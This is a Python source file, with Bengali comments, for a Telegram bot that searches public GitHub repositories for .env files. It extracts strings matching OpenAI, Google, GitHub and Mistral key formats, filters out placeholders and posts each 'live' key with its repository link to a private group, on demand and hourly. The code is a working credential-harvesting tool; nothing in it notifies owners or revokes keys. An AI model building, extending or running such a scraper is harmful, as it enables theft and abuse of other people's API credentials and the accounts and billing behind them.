import logging
import os
import re
import time
import threading
from datetime import datetime
from typing import List, Dict
import base64
import traceback

from flask import Flask
from dotenv import load_dotenv
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler

# লোড এনভায়রনমেন্ট
load_dotenv()

# কনফিগারেশন
BOT_TOKEN = os.getenv('BOT_TOKEN')
PRIVATE_GROUP_ID = int(os.getenv('PRIVATE_GROUP_ID')) if os.getenv('PRIVATE_GROUP_ID') else None
ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID')) if os.getenv('ADMIN_USER_ID') else None
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')

# লগিং - আরও ডিটেইলড
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.DEBUG  # DEBUG লেভেল সেট করলাম
)
logger = logging.getLogger(__name__)

# ফ্লাস্ক অ্যাপ
flask_app = Flask(__name__)

@flask_app.route('/')
def health_check():
    return "True", 200

@flask_app.route('/health')
def health():
    return {"status": "healthy", "timestamp": datetime.now().isoformat()}, 200

# API কী ডিটেক্টর - সরলীকৃত এবং ডিবাগ সহ
class APIScraper:
    def __init__(self, token: str):
        self.token = token
        self.headers = {
            'Authorization': f'token {token}',
            'Accept': 'application/vnd.github.v3+json'
        }
        self.base_url = 'https://api.github.com'
        self.seen_keys = set()
        
        # শুধুমাত্র কয়েকটি প্যাটার্ন (টেস্টের জন্য)
        self.patterns = {
            'OpenAI': r'sk-[a-zA-Z0-9]{48}',
            'Mistral': r'[A-Za-z0-9]{32}',
            'Google': r'AIza[0-9A-Za-z\-_]{35}',
            'GitHub': r'ghp_[0-9a-zA-Z]{36}',
        }

    def search_live_keys(self) -> List[Dict]:
        """সরলীকৃত সার্চ - শুধু .env ফাইল খুঁজে"""
        found_keys = []
        logger.info("🔍 Starting GitHub search...")
        
        try:
            # শুধু একটি কোয়েরি (রেট লিমিটের জন্য)
            query = 'filename:.env'
            url = f'{self.base_url}/search/code?q={query}&per_page=10'
            
            logger.info(f"📡 Calling GitHub API: {url}")
            response = requests.get(url, headers=self.headers)
            
            logger.info(f"📊 Response Status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                items = data.get('items', [])
                logger.info(f"📁 Found {len(items)} files")
                
                for idx, item in enumerate(items[:5]):  # প্রথম ৫টি ফাইল
                    logger.info(f"🔍 Processing file {idx+1}: {item.get('path')}")
                    key_info = self._extract_key_from_file(item)
                    if key_info:
                        logger.info(f"✅ Found key: {key_info['type']} in {key_info['source']}")
                        found_keys.append(key_info)
                        self.seen_keys.add(key_info['key'])
                    else:
                        logger.info(f"❌ No key found in this file")
                        
            elif response.status_code == 403:
                logger.error("🚫 GitHub API Rate Limit Exceeded! Waiting...")
                # রেট লিমিটের জন্য অপেক্ষা
                time.sleep(60)
            else:
                logger.error(f"❌ GitHub API Error: {response.status_code} - {response.text[:200]}")
                
            return found_keys[:10]
            
        except Exception as e:
            logger.error(f"❌ Search error: {e}")
            logger.error(traceback.format_exc())
            return []

    def _extract_key_from_file(self, item: Dict) -> Dict:
        """সরলীকৃত এক্সট্র্যাকশন"""
        try:
            file_url = item.get('url')
            repo_name = item.get('repository', {}).get('full_name', 'Unknown')
            file_path = item.get('path', 'Unknown')
            
            logger.info(f"📄 Fetching: {file_url}")
            response = requests.get(file_url, headers=self.headers)
            
            if response.status_code != 200:
                logger.warning(f"⚠️ Cannot fetch file: {response.status_code}")
                return None
                
            content_data = response.json()
            if 'content' not in content_data:
                logger.warning("⚠️ No content in response")
                return None
                
            # ডিকোড
            content = base64.b64decode(content_data['content']).decode('utf-8', errors='ignore')
            logger.info(f"📝 File content length: {len(content)} chars")
            
            # প্রতিটি প্যাটার্ন চেক
            for key_type, pattern in self.patterns.items():
                matches = re.findall(pattern, content)
                if matches:
                    logger.info(f"🎯 Found {len(matches)} {key_type} keys")
                    for match in matches[:3]:  # প্রতি ফাইলে ৩টি পর্যন্ত
                        if self._is_valid_key(match):
                            return {
                                'key': match,
                                'type': key_type,
                                'source': repo_name,
                                'file': file_path,
                                'url': f"https://github.com/{repo_name}/blob/main/{file_path}",
                                'platform': key_type  # সরলীকৃত
                            }
            
            return None
            
        except Exception as e:
            logger.error(f"❌ Extract error: {e}")
            logger.error(traceback.format_exc())
            return None

    def _is_valid_key(self, key: str) -> bool:
        """সরলীকৃত ভ্যালিডেশন"""
        if not key or len(key) < 10:
            return False
            
        # বাদ দেওয়ার প্যাটার্ন
        exclude = ['test', 'example', 'sample', 'demo', 'xxxx', '1234']
        for ex in exclude:
            if ex in key.lower():
                return False
                
        return True

# বট ক্লাস - ডিবাগ সহ
class KeyScraperBot:
    def __init__(self, token: str, group_id: int, admin_id: int):
        self.token = token
        self.group_id = group_id
        self.admin_id = admin_id
        self.updater = None
        self.bot = None
        self.scraper = APIScraper(GITHUB_TOKEN) if GITHUB_TOKEN else None
        self.is_running = True
        self.startup_sent = False
        
        logger.info(f"🤖 Bot initialized with:")
        logger.info(f"  - Group ID: {group_id}")
        logger.info(f"  - Admin ID: {admin_id}")
        logger.info(f"  - GitHub Token: {'✅ Present' if GITHUB_TOKEN else '❌ Missing'}")

    def start(self):
        try:
            logger.info("🚀 Starting bot...")
            
            # আপডেটার তৈরি
            self.updater = Updater(token=self.token, use_context=True)
            self.bot = self.updater.bot
            
            # টেস্ট মেসেজ
            try:
                logger.info("📤 Sending test message...")
                self.bot.send_message(
                    chat_id=self.group_id, 
                    text="🔄 Bot is starting... Please wait."
                )
                logger.info("✅ Test message sent successfully!")
            except Exception as e:
                logger.error(f"❌ Test message failed: {e}")
                logger.error(f"Please check: BOT_TOKEN and GROUP_ID")
            
            # হ্যান্ডলার যোগ
            dp = self.updater.dispatcher
            dp.add_handler(CommandHandler("start", self.start_command))
            dp.add_handler(CallbackQueryHandler(self.button_callback))
            dp.add_error_handler(self.error_handler)
            
            # শিডিউলার শুরু
            threading.Thread(target=self.run_scheduler, daemon=True).start()
            
            logger.info("✅ Bot is ready!")
            
            # পোলিং শুরু
            self.updater.start_polling()
            self.updater.idle()
            
        except Exception as e:
            logger.error(f"❌ Bot start error: {e}")
            logger.error(traceback.format_exc())
            raise

    def start_command(self, update: Update, context):
        """স্টার্ট কমান্ড - ডিবাগ সহ"""
        try:
            user_id = update.effective_user.id if update.effective_user else None
            logger.info(f"📩 /start from user: {user_id}")
            
            if not user_id or user_id != self.admin_id:
                update.message.reply_text("⛔ Access Denied!")
                logger.warning(f"🚫 Unauthorized access from {user_id}")
                return

            keyboard = [
                [InlineKeyboardButton("🔍 স্ক্যান এখন", callback_data='scan_now')],
                [InlineKeyboardButton("📊 পরিসংখ্যান", callback_data='stats')],
                [InlineKeyboardButton("ℹ️ সাহায্য", callback_data='help')],
            ]
            
            update.message.reply_text(
                "🔐 **GitHub API Key Scraper**\n\n"
                "GitHub থেকে লাইভ API কী খুঁজে বের করি!\n"
                "Select an option:",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
            logger.info("✅ Menu sent to admin")
            
        except Exception as e:
            logger.error(f"❌ Start command error: {e}")
            logger.error(traceback.format_exc())

    def button_callback(self, update: Update, context):
        """বাটন কলব্যাক - ডিবাগ সহ"""
        try:
            query = update.callback_query
            user_id = update.effective_user.id if update.effective_user else None
            
            logger.info(f"🔄 Button pressed: {query.data} by user {user_id}")
            query.answer()
            
            if user_id != self.admin_id:
                query.edit_message_text("⛔ Access Denied!")
                logger.warning(f"🚫 Unauthorized button from {user_id}")
                return

            if query.data == 'scan_now':
                self.scan_now(query)
            elif query.data == 'stats':
                self.show_stats(query)
            elif query.data == 'help':
                self.show_help(query)
            else:
                logger.warning(f"⚠️ Unknown callback: {query.data}")
                
        except Exception as e:
            logger.error(f"❌ Button callback error: {e}")
            logger.error(traceback.format_exc())

    def scan_now(self, query):
        """স্ক্যান - ডিবাগ সহ"""
        try:
            logger.info("🔍 Scan now triggered")
            query.edit_message_text("🔍 Scanning GitHub for live keys...")
            
            if not self.scraper:
                query.edit_message_text("❌ GitHub Token missing!")
                return
            
            # স্ক্যান থ্রেড
            def scan_thread():
                try:
                    logger.info("📡 Starting scan thread...")
                    keys = self.scraper.search_live_keys()
                    
                    logger.info(f"📊 Scan complete: {len(keys)} keys found")
                    
                    if not keys:
                        self.bot.edit_message_text(
                            chat_id=query.message.chat_id,
                            message_id=query.message.message_id,
                            text="❌ কোনো লাইভ কী পাওয়া যায়নি!\n\n💡 Tips:\n- GitHub API রেট লিমিট চেক করুন\n- .env ফাইল থাকা রিপো খুঁজুন"
                        )
                        return
                    
                    sent = 0
                    for key_info in keys[:5]:
                        message = self.format_key_message(key_info)
                        try:
                            self.bot.send_message(
                                chat_id=self.group_id,
                                text=message,
                                parse_mode='Markdown',
                                disable_web_page_preview=True
                            )
                            sent += 1
                            logger.info(f"✅ Sent key #{sent}: {key_info['type']}")
                            time.sleep(0.5)
                        except Exception as e:
                            logger.error(f"❌ Send error: {e}")
                    
                    self.bot.edit_message_text(
                        chat_id=query.message.chat_id,
                        message_id=query.message.message_id,
                        text=f"✅ {sent}টি লাইভ কী পাওয়া গেছে এবং গ্রুপে পাঠানো হয়েছে!"
                    )
                    
                except Exception as e:
                    logger.error(f"❌ Scan thread error: {e}")
                    logger.error(traceback.format_exc())
                    self.bot.edit_message_text(
                        chat_id=query.message.chat_id,
                        message_id=query.message.message_id,
                        text=f"❌ Error: {str(e)[:200]}"
                    )
            
            threading.Thread(target=scan_thread, daemon=True).start()
            
        except Exception as e:
            logger.error(f"❌ Scan now error: {e}")
            logger.error(traceback.format_exc())

    def show_stats(self, query):
        """পরিসংখ্যান"""
        try:
            stats = f"""
📊 **Key Scraper Statistics**

🔍 Keys Found: {len(self.scraper.seen_keys) if self.scraper else 0}
🕐 Last Scan: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🎯 Platforms: OpenAI, Mistral, Google, GitHub

🔹 Auto-scans every 1 hour
🔹 4+ key patterns detected
🔹 Only live/exposed keys
"""
            query.edit_message_text(stats, parse_mode='Markdown')
            logger.info("📊 Stats shown")
        except Exception as e:
            logger.error(f"❌ Stats error: {e}")

    def show_help(self, query):
        """সাহায্য"""
        help_text = """
ℹ️ **How it works:**

1. 🔍 Scans GitHub for exposed API keys
2. 📂 Checks .env files
3. 🔑 Detects 4+ key types
4. 📨 Sends live keys to this group

⚠️ **Note:**
- GitHub API has rate limits (60 req/hour for free)
- Only scans public repositories
- Keys may be dummy/expired

🛠 **Troubleshooting:**
- Check logs for errors
- Make sure GitHub token is valid
- Add more patterns if needed
"""
        query.edit_message_text(help_text, parse_mode='Markdown')

    def format_key_message(self, key_info: Dict) -> str:
        """কী ফরম্যাট"""
        return f"""
🔑 **LIVE API KEY FOUND!**

📌 **Platform**: {key_info.get('platform', 'Unknown')}
🔐 **Type**: {key_info.get('type', 'Unknown')}
🔑 **Key**: `{key_info.get('key', 'N/A')}`

📂 **Source**: {key_info.get('source', 'Unknown')}
📄 **File**: {key_info.get('file', 'Unknown')}
🔗 [View File]({key_info.get('url', '#')})

🕐 Found: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} UTC
"""

    def send_startup_message(self):
        """স্টার্টআপ মেসেজ"""
        if self.startup_sent or not self.bot:
            return
        try:
            time.sleep(5)
            self.bot.send_message(
                chat_id=self.group_id,
                text="🔐 **GitHub API Key Scraper Bot**\n\n"
                     "আমি GitHub থেকে লাইভ API কী খুঁজে বের করি!\n\n"
                     "🔹 প্রতি ১ ঘন্টায় অটো স্ক্র্যাপ\n"
                     "🔹 ৪+ ধরনের API কী ডিটেক্ট\n"
                     "🔹 শুধুমাত্র লাইভ কী\n\n"
                     "/start - কন্ট্রোল প্যানেল",
                parse_mode='Markdown'
            )
            self.startup_sent = True
            logger.info("📤 Startup message sent")
        except Exception as e:
            logger.error(f"❌ Startup message error: {e}")

    def run_scheduler(self):
        """শিডিউলার"""
        self.send_startup_message()
        while self.is_running:
            try:
                if self.scraper:
                    logger.info("🔄 Scheduled scan starting...")
                    keys = self.scraper.search_live_keys()
                    if keys:
                        for key_info in keys[:3]:
                            message = self.format_key_message(key_info)
                            self.bot.send_message(
                                chat_id=self.group_id,
                                text=message,
                                parse_mode='Markdown',
                                disable_web_page_preview=True
                            )
                            time.sleep(0.5)
                        logger.info(f"✅ Scheduled: Sent {len(keys[:3])} keys")
                else:
                    logger.warning("⚠️ No scraper available")
            except Exception as e:
                logger.error(f"❌ Scheduler error: {e}")
            time.sleep(3600)

    def error_handler(self, update: Update, context):
        """এরর হ্যান্ডলার"""
        logger.error(f"❌ Update {update} caused error: {context.error}")
        logger.error(traceback.format_exc())

# মেইন
def main():
    try:
        # এনভায়রনমেন্ট চেক
        logger.info("🔍 Checking environment variables...")
        
        if not BOT_TOKEN:
            raise ValueError("❌ BOT_TOKEN is missing!")
        if not PRIVATE_GROUP_ID:
            raise ValueError("❌ PRIVATE_GROUP_ID is missing!")
        if not ADMIN_USER_ID:
            raise ValueError("❌ ADMIN_USER_ID is missing!")
        if not GITHUB_TOKEN:
            raise ValueError("❌ GITHUB_TOKEN is missing!")
            
        logger.info("✅ All environment variables present")
        logger.info(f"📊 Bot Token: {BOT_TOKEN[:10]}...")
        logger.info(f"📊 Group ID: {PRIVATE_GROUP_ID}")
        logger.info(f"📊 Admin ID: {ADMIN_USER_ID}")
        
        # ফ্লাস্ক
        def run_flask():
            port = int(os.environ.get('PORT', 8080))
            flask_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
        
        flask_thread = threading.Thread(target=run_flask, daemon=True)
        flask_thread.start()
        logger.info("🌐 Flask server started")

        # বট স্টার্ট
        bot = KeyScraperBot(BOT_TOKEN, PRIVATE_GROUP_ID, ADMIN_USER_ID)
        bot.start()
        
    except Exception as e:
        logger.error(f"❌ Main error: {e}")
        logger.error(traceback.format_exc())
        import sys
        sys.exit(1)

if __name__ == '__main__':
    main()
